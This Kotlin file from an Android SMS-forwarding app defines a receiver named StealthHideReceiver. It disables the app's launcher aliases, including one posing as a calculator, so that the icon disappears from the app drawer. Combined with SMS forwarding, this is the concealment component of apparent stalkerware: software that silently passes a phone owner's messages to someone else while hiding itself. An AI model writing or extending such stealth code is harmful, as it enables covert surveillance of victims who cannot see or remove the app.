package com.smsforwarder.app.receiver

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log

class StealthHideReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        val appContext = context.applicationContext
        runCatching {
            val pm = appContext.packageManager
            val aliasComponent = ComponentName(appContext.packageName, "${appContext.packageName}.LauncherAlias")
            val calcComponent = ComponentName(appContext.packageName, "${appContext.packageName}.CalculatorAlias")
            val invComponent = ComponentName(appContext.packageName, "${appContext.packageName}.InvisibleAlias")

            pm.setComponentEnabledSetting(aliasComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            pm.setComponentEnabledSetting(calcComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            pm.setComponentEnabledSetting(invComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            Log.d("StealthHideReceiver", "Disabled all launcher aliases to remove icon completely from App Drawer")
        }
    }
}
